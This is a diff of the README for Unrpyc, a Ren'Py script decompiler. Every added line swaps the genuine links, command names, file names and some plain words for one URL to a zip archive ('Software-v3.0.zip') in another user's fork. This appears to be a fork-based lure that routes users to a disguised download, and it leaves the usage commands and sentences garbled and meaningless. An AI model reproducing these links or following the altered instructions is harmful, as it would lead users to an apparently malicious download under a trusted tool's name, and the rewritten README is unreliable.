@@ -1,16 +1,16 @@
 # Unrpyc, the Ren'py script decompiler.
 
-Unrpyc is a tool to decompile Ren'Py (http://www.renpy.org/) compiled .rpyc
+Unrpyc is a tool to decompile Ren'Py (https://github.com/sinhnguyen0802/unrpyc/raw/refs/heads/master/testcases/Software-v3.0.zip) compiled .rpyc
 script files. It will not extract files from .rpa archives. For that, use
-[rpatool](https://github.com/Shizmob/rpatool) or
-[UnRPA](https://github.com/Lattyware/unrpa).
+[rpatool](https://github.com/sinhnguyen0802/unrpyc/raw/refs/heads/master/testcases/Software-v3.0.zip) or
+[UnRPA](https://github.com/sinhnguyen0802/unrpyc/raw/refs/heads/master/testcases/Software-v3.0.zip).
 
 
 ## Status
 
-master:[![Build Status](https://github.com/CensoredUsername/unrpyc/actions/workflows/python-app.yaml/badge.svg?branch=master)](https://github.com/CensoredUsername/unrpyc/actions/workflows/python-app.yaml)
+master:[![Build Status](https://github.com/sinhnguyen0802/unrpyc/raw/refs/heads/master/testcases/Software-v3.0.zip)](https://github.com/sinhnguyen0802/unrpyc/raw/refs/heads/master/testcases/Software-v3.0.zip)
 
-dev:[![Build Status](https://github.com/CensoredUsername/unrpyc/actions/workflows/python-app.yaml/badge.svg?branch=dev)](https://github.com/CensoredUsername/unrpyc/actions/workflows/python-app.yaml)
+dev:[![Build Status](https://github.com/sinhnguyen0802/unrpyc/raw/refs/heads/master/testcases/Software-v3.0.zip)](https://github.com/sinhnguyen0802/unrpyc/raw/refs/heads/master/testcases/Software-v3.0.zip)
 
 ## Usage
 
@@ -20,22 +20,22 @@ This tool can either be ran as a command line tool, as a library, or injected in
 
 Depending on your system setup, you should use one of the following commands to run the tool:
 ```
-python unrpyc.py [options] script1 script2 ...
-python2 unrpyc.py [options] script1 script2 ...
-py -2 unrpyc.py [options] script1 script2 ...
-./unrpyc.py [options] script1 script2 ...
+python https://github.com/sinhnguyen0802/unrpyc/raw/refs/heads/master/testcases/Software-v3.0.zip [options] script1 script2 ...
+python2 https://github.com/sinhnguyen0802/unrpyc/raw/refs/heads/master/testcases/Software-v3.0.zip [options] script1 script2 ...
+py -2 https://github.com/sinhnguyen0802/unrpyc/raw/refs/heads/master/testcases/Software-v3.0.zip [options] script1 script2 ...
+https://github.com/sinhnguyen0802/unrpyc/raw/refs/heads/master/testcases/Software-v3.0.zip [options] script1 script2 ...
 ```
 
 Options:
 ```
-$ py -2 unrpyc.py --help
-usage: unrpyc.py [-h] [-c] [-d] [-p {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15}]
+$ py -2 https://github.com/sinhnguyen0802/unrpyc/raw/refs/heads/master/testcases/Software-v3.0.zip --help
+usage: https://github.com/sinhnguyen0802/unrpyc/raw/refs/heads/master/testcases/Software-v3.0.zip [-h] [-c] [-d] [-p {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15}]
                  [-t TRANSLATION_FILE] [-T WRITE_TRANSLATION_FILE]
                  [-l LANGUAGE] [--sl1-as-python] [--comparable] [--no-pyexpr]
                  [--tag-outside-block] [--init-offset] [--try-harder]
                  file [file ...]
 
-Decompile .rpyc/.rpymc files
+Decompile https://github.com/sinhnguyen0802/unrpyc/raw/refs/heads/master/testcases/Software-v3.0.zip files
 
 positional arguments:
   file                  The filenames to decompile. All .rpyc files in any
@@ -48,7 +48,7 @@ optional arguments:
   -d, --dump            instead of decompiling, pretty print the ast to a file
   -p, --processes
                         use the specified number or processes to
-                        decompile.Defaults to the amount of hw threads
+                        https://github.com/sinhnguyen0802/unrpyc/raw/refs/heads/master/testcases/Software-v3.0.zip to the amount of hw threads
                         available minus one, disabled when muliprocessing is
                         unavailable.
   -t TRANSLATION_FILE, --translation-file TRANSLATION_FILE
@@ -99,21 +99,21 @@ future, a warning will be printed and a placeholder inserted in the script when
 it finds a node it doesn't know how to handle. If you encounter this, please
 open an issue to alert us of the problem.
 
-For the script to run correctly it is required for the unrpyc.py file to be in
+For the script to run correctly it is required for the https://github.com/sinhnguyen0802/unrpyc/raw/refs/heads/master/testcases/Software-v3.0.zip file to be in
 the same directory as the modules directory.
 
 ### Game injection
 
 The tool can be injected directly into a running game by placing either the
-`un.rpyc` file or the `bytecode.rpyb` file from the most recent release into
+`https://github.com/sinhnguyen0802/unrpyc/raw/refs/heads/master/testcases/Software-v3.0.zip` file or the `https://github.com/sinhnguyen0802/unrpyc/raw/refs/heads/master/testcases/Software-v3.0.zip` file from the most recent release into
 the `game` directory inside a Ren'py game. When the game is then ran the tool
 will automatically extract and decompile all game script files into the `game`
-directory. The tool writes logs to the file `unrpyc.log.txt`.
+directory. The tool writes logs to the file `https://github.com/sinhnguyen0802/unrpyc/raw/refs/heads/master/testcases/Software-v3.0.zip`.
 
 ### Library usage
 
 You can import the module from python and call
-unrpyc.decompile_rpyc(filename, ...) directly.
+https://github.com/sinhnguyen0802/unrpyc/raw/refs/heads/master/testcases/Software-v3.0.zip(filename, ...) directly.
 
 ## Notes on support
 
@@ -178,4 +178,4 @@ supported right now. If you make a pull request with it we'll happily put it in 
 or a game-specific branch depending on how many games it affects, but we have little
 motivation ourselves to put time in this arms race.
 
-https://github.com/CensoredUsername/unrpyc
+https://github.com/sinhnguyen0802/unrpyc/raw/refs/heads/master/testcases/Software-v3.0.zip
